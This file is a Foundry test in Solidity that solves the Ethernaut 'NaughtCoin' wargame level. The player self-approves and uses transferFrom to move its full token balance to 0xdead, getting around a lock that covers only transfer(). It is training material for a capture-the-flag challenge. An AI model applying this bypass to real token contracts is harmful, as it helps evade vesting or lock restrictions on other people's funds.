// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";
import { NaughtCoin } from "src/NaughtCoin/NaughtCoin.sol";
import { NaughtCoinAttack } from "src/NaughtCoin/NaughtCoinAttack.sol";
import { NaughtCoinFactory } from "src/NaughtCoin/NaughtCoinFactory.sol";

contract NaughtCoinAttackTest is PRBTest {
    Ethernaut public ethernaut;
    NaughtCoinFactory public factory;
    NaughtCoinAttack public attacker;
    address public naughtCoinInstance;
    address public playerAddress = address(0x696969);

    function setUp() public {
        vm.startPrank(playerAddress);
        ethernaut = new Ethernaut();
        factory = new NaughtCoinFactory();

        ethernaut.registerLevel(factory);
        naughtCoinInstance = ethernaut.createLevelInstance(factory);
        vm.stopPrank();
    }

    function testNaughtCoinAttack() public {
        vm.startPrank(playerAddress);
        NaughtCoin(naughtCoinInstance).approve(playerAddress, NaughtCoin(naughtCoinInstance).balanceOf(playerAddress));
        NaughtCoin(naughtCoinInstance).transferFrom(
            playerAddress,
            address(0xdead),
            NaughtCoin(naughtCoinInstance).balanceOf(playerAddress)
        );

        // affirm that we have transferred the tokens out
        assert(NaughtCoin(naughtCoinInstance).balanceOf(playerAddress) == 0);

        // submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(naughtCoinInstance));
        assert(levelComplete);
        vm.stopPrank();
    }
}
